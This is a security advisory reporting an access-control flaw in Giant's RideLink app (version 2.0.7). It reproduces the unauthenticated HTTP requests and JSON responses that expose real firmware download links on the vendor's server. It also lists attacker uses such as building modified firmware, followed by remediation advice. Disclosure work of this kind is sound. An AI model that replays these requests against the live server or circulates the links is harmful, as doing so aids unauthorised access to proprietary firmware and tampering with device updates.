# Vulnerability Report - tw.giant.ridelink- Incorrect Access Control

**Product:** `tw.giant.ridelink` 

**Vendor:** [GIANT MANUFACTURING CO., LTD.](https://www.giant-bicycles.com/global/ridelink-app)

**Version:** 2.0.7

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `tw.giant.ridelink` , developed by **GIANT MANUFACTURING CO., LTD.**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTPS requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `UPDATE_URL, UPDATE_DEV_URL` Field values in the `UpdateFragment` class provide the necessary URL and other information required for the HTTPS request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241003190214911](https://s2.loli.net/2024/10/03/pQHcelA4OJtWPdo.png)

   ![image-20241003190228763](https://s2.loli.net/2024/10/03/GKHUg4VXCDwIJvt.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET https://www.action-digit.com/ridelink/updateinfo.json HTTP/1.1
   User-Agent: Fiddler Everywhere
   Host: www.action-digit.com
   ```

   ```http
   GET https://www.action-digit.com/ridelinkbk/updateinfo.json HTTP/1.1
   User-Agent: Fiddler Everywhere
   Host: www.action-digit.com
   ```

   > Response:

   ```http
   HTTP/1.1 200 OK
   Date: Thu, 03 Oct 2024 11:03:32 GMT
   Server: Apache/2.4.18 (Ubuntu)
   Last-Modified: Tue, 01 Oct 2019 01:45:07 GMT
   ETag: "2ca-593cf808e3063"
   Accept-Ranges: bytes
   Content-Length: 714
   Content-Type: application/json
   
   [{"powerpro2": {"var": "", "url": "https://www.action-digit.com/ridelink/powerpro_app_2_3_7.zip", "md5": "ba6a367e9e6bf762c286179e5ccd404d"}}, {"powerpro1l": {"var": "", "url": "https://www.action-digit.com/ridelink/left_crank_app_2238.zip", "md5": "22a45fd6e2f2121b3c4e0d75fa4e934c"}}, {"corona": {"var": "", "url": "https://www.action-digit.com/ridelink/GiantApp14.zip", "md5": "1fdc7f66d1b413264feda9d2c0622f7e"}}, {"smarttrainer": {"var": "", "url": "https://www.action-digit.com/ridelink/cyclosmart_cps_a411908121.zip", "md5": "8b78b0c63ed3541cb447654a28e68ea4"}}, {"powerpro1r": {"var": "", "url": "https://www.action-digit.com/ridelink/right_crank_app_2238.zip", "md5": "8108cb65e117607f4370493b705869c5"}}]
   ```

   ```http
   HTTP/1.1 200 OK
   Date: Thu, 03 Oct 2024 11:04:31 GMT
   Server: Apache/2.4.18 (Ubuntu)
   Last-Modified: Mon, 30 Sep 2019 06:32:33 GMT
   ETag: "2d4-593bf66a8396a"
   Accept-Ranges: bytes
   Content-Length: 724
   Content-Type: application/json
   
   [{"powerpro2": {"var": "", "url": "https://www.action-digit.com/ridelinkbk/powerpro_app_2_3_7.zip", "md5": "ba6a367e9e6bf762c286179e5ccd404d"}}, {"powerpro1l": {"var": "", "url": "https://www.action-digit.com/ridelinkbk/left_crank_app_2238.zip", "md5": "22a45fd6e2f2121b3c4e0d75fa4e934c"}}, {"corona": {"var": "", "url": "https://www.action-digit.com/ridelinkbk/GiantApp14.zip", "md5": "1fdc7f66d1b413264feda9d2c0622f7e"}}, {"smarttrainer": {"var": "", "url": "https://www.action-digit.com/ridelinkbk/cyclosmart_cps_a411908121.zip", "md5": "8b78b0c63ed3541cb447654a28e68ea4"}}, {"powerpro1r": {"var": "", "url": "https://www.action-digit.com/ridelinkbk/right_crank_app_2238.zip", "md5": "8108cb65e117607f4370493b705869c5"}}]
   ```

3. Consequently, the unprotected firmware can be directly downloaded using this information.
   ![image-20241003190546459](https://s2.loli.net/2024/10/03/SKrR98i2gOVXZIk.png)

   In total, we successfully downloaded **5 firmware** by exploiting the vulnerability.


## Impact

An attacker can exploit this vulnerability to:

* Download the latest firmware before it is officially released.
* Analyze the firmware for vulnerabilities or proprietary information.
* Create modified firmware images with malicious code.
* Distribute compromised firmware updates to unsuspecting users.

## Remediation

* Implement proper access control on the firmware server, such as device ID and user ID verification.
* Enhance the app's firmware update mechanism to include authentication credentials in the requests.
* Deprecate the firmware download links used in the old app.


## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.